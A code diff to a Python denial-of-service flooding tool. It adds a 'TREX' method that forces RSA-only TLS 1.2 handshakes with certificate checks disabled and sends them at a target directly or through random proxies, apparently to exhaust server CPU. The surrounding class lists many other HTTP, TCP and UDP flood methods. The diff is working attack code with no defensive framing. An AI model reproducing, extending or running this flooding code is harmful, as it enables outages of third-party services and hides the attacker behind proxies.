@@ -16,10 +16,11 @@ from urllib import parse
 
 import aiohttp
 import async_timeout
+from OpenSSL import SSL
 from yarl import URL
 
 from . import proxy_proto
-from .proto import DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType
+from .proto import DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType, TrexIO 
 from .proxies import NoProxySet, ProxySet
 from .targets import TargetStats
 from .vendor.referers import REFERERS
@@ -44,13 +45,35 @@ ctx.verify_mode = CERT_NONE
 ctx.set_ciphers("DEFAULT")
 
 
+trex_ctx = SSL.Context(SSL.TLSv1_2_METHOD)
+# Making sure we are using TLS1.2 with RSA cipher suite (key exchange, authentication)
+#
+# AES256-CCM8             TLSv1.2 Kx=RSA      Au=RSA  Enc=AESCCM8(256) Mac=AEAD
+# AES256-CCM              TLSv1.2 Kx=RSA      Au=RSA  Enc=AESCCM(256) Mac=AEAD
+# ARIA256-GCM-SHA384      TLSv1.2 Kx=RSA      Au=RSA  Enc=ARIAGCM(256) Mac=AEAD
+# AES128-GCM-SHA256       TLSv1.2 Kx=RSA      Au=RSA  Enc=AESGCM(128) Mac=AEAD
+# AES128-CCM8             TLSv1.2 Kx=RSA      Au=RSA  Enc=AESCCM8(128) Mac=AEAD
+# AES128-CCM              TLSv1.2 Kx=RSA      Au=RSA  Enc=AESCCM(128) Mac=AEAD
+# ARIA128-GCM-SHA256      TLSv1.2 Kx=RSA      Au=RSA  Enc=ARIAGCM(128) Mac=AEAD
+# AES256-SHA256           TLSv1.2 Kx=RSA      Au=RSA  Enc=AES(256)  Mac=SHA256
+# CAMELLIA256-SHA256      TLSv1.2 Kx=RSA      Au=RSA  Enc=Camellia(256) Mac=SHA256
+# AES128-SHA256           TLSv1.2 Kx=RSA      Au=RSA  Enc=AES(128)  Mac=SHA256
+# CAMELLIA128-SHA256      TLSv1.2 Kx=RSA      Au=RSA  Enc=Camellia(128) Mac=SHA256
+# NULL-SHA256             TLSv1.2 Kx=RSA      Au=RSA  Enc=None      Mac=SHA256
+trex_ctx.set_cipher_list(b"RSA")
+trex_ctx.set_verify(SSL.VERIFY_NONE, None)
+
+
 class Methods:
     HTTP_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "RGET", "HEAD", "RHEAD", "POST", "STRESS", "DYN", "SLOW",
         "NULL", "COOKIE", "PPS", "EVEN", "AVB", "OVH",
-        "APACHE", "XMLRPC", "DOWNLOADER", "RHEX", "STOMP"
+        "APACHE", "XMLRPC", "DOWNLOADER", "RHEX", "STOMP",
+        # this is not HTTP method (rather TCP) but this way it works with --http-methods
+        # settings being applied to the entire set of targets
+        "TREX" 
     }
-    TCP_METHODS: Set[str] = {"TCP"}
+    TCP_METHODS: Set[str] = {"TCP",}
     UDP_METHODS: Set[str] = {
         "UDP", "VSE", "FIVEM", "TS3", "MCPE",
         # the following methods are temporarily disabled for further investigation and testing
@@ -303,27 +326,8 @@ class AsyncTcpFlood:
             )
             conn = self._loop.create_connection(
                 flood_proto, host=proxy.proxy_host, port=proxy.proxy_port)
-        transport = None
-        try:
-            async with async_timeout.timeout(self._settings.connect_timeout_seconds):
-                transport, _ = await conn
-            sock = transport.get_extra_info("socket")
-            if sock and hasattr(sock, "setsockopt"):
-                sock.setsockopt(SOL_SOCKET, SO_RCVBUF, self._settings.socket_rcvbuf)
-        except asyncio.CancelledError as e:
-            if on_connect:
-                on_connect.cancel()
-            on_close.cancel()
-            raise e
-        except Exception as e:
-            if on_connect:
-                on_connect.set_exception(e)
-            raise e
-        else:
-            return bool(await on_close)
-        finally:
-            if transport:
-                transport.close()
+
+        return await self._exec_proto(conn, on_connect, on_close)
 
     async def GET(self, on_connect=None) -> bool:
         payload: bytes = self.build_request()
@@ -598,6 +602,63 @@ class AsyncTcpFlood:
                 yield FloodOp.WRITE, (p2, p2_size)
 
         return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)
+
+    async def TREX(self, on_connect=None) -> bool:
+        on_close = self._loop.create_future()
+
+        trex_proto = partial(
+            TrexIO,
+            trex_ctx,
+            self._settings.requests_per_connection,
+            self._stats,
+            self._loop,
+            on_connect,
+            on_close
+        )
+        proxy_url: Optional[str] = self._proxies.pick_random()
+        if proxy_url is None:
+            addr, port = self._raw_target
+            conn = self._loop.create_connection(trex_proto, host=addr, port=port, ssl=None)
+        else:
+            proxy, proxy_protocol = proxy_proto.for_proxy(proxy_url)
+            on_socket = self._loop.create_future()
+            trex_proto = partial(
+                proxy_protocol,
+                self._loop,
+                on_close,
+                self._raw_target,
+                None,
+                downstream_factory=trex_proto,
+                connect_timeout=self._settings.dest_connect_timeout_seconds,
+                on_connect=self._loop.create_future() # as we don't want it to fire too early
+            )
+            conn = self._loop.create_connection(
+                trex_proto, host=proxy.proxy_host, port=proxy.proxy_port, ssl=None)
+
+        return await self._exec_proto(conn, on_connect, on_close)
+
+    async def _exec_proto(self, conn, on_connect, on_close) -> bool:
+        transport = None
+        try:
+            async with async_timeout.timeout(self._settings.connect_timeout_seconds):
+                transport, _ = await conn
+            sock = transport.get_extra_info("socket")
+            if sock and hasattr(sock, "setsockopt"):
+                sock.setsockopt(SOL_SOCKET, SO_RCVBUF, self._settings.socket_rcvbuf)
+        except asyncio.CancelledError as e:
+            if on_connect:
+                on_connect.cancel()
+            on_close.cancel()
+            raise e
+        except Exception as e:
+            if on_connect:
+                on_connect.set_exception(e)
+            raise e
+        else:
+            return bool(await on_close)
+        finally:
+            if transport:
+                transport.close()
 
 
 class AsyncUdpFlood:
